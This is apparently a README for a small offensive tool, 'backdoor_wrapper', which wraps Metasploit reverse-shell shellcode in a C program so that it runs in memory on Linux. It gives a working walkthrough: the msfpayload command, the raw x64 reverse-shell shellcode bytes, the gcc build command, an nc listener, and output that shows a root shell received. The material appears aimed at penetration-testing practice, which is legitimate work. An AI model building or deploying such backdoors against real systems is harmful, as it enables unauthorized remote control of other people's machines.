backdoor_wrapper
================

A linux wrapper for msfpaylod shellcodes.


As you probably know it is fairly easy to create executable backdoors for Windows with msfpayload. Sometimes I want to have a meterpreter shell to the target machine even if I have a normal shell access. In this case I usually upload a meterpreter reverse shell .exe generated with msfpayload and simply execute it from my current shell. This is not so simple in Linux as it seems or at least I haven't found a simple way. The only problem is that msfpayload don't generate linux binaries. So the goal was to be able to use the metasploit payloads in binaries that can be executed under linux/unix systems. My solution was to create a wrapper C program for the shell code which will load it to the memory and execute it in the memory. This way the shell code can be generated with msfpayload for C and can be copy-pasted in the wrapper program. After that the code needs to be compiled than it's ready to go.

Let's see an example. First let's generate a reverse shell which will connect to the localhost (for the sake of testing) when executed. The necessary command is the following:

root@bt:~# msfpayload linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=7777 C
/*
 * linux/x64/shell_reverse_tcp - 74 bytes
 * http://www.metasploit.com
 * VERBOSE=false, LHOST=127.0.0.1, LPORT=7777, 
 * ReverseConnectRetries=5, ReverseAllowProxy=false, 
 * PrependSetresuid=false, PrependSetreuid=false, 
 * PrependSetuid=false, PrependSetresgid=false, 
 * PrependSetregid=false, PrependSetgid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * InitialAutoRunScript=, AutoRunScript=
 */
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x1e\x61\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
 
So we have a shell code in C syntax.

The build the binary the following command should be run:
root@bt:~# gcc -o backdoor_example backdoor_example.c

To test it we need to start a listener:

root@bt:~# nc -lvvp 7777
listening on [any] 7777 ...

and start the backdoor:
root@bt:~/OSCP# ./backdoor_example

The executable will return immediately since it just spawns a process for the shellcode and then it returns. However with our listener we will receive the reverse shell:
root@bt:~# nc -lvvp 7777
listening on [any] 7777 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 47355
ls
bin
boot
cdrom
chroots
dev
etc
home
initrd.img
lib
lib32
lib64
lost+found
media
mnt
nis
opt
pentest
proc
root
sbin
selinux
share
srv
sys
tmp
usr
var
vmlinuz
id
uid=0(root) gid=0(root) groups=0(root)


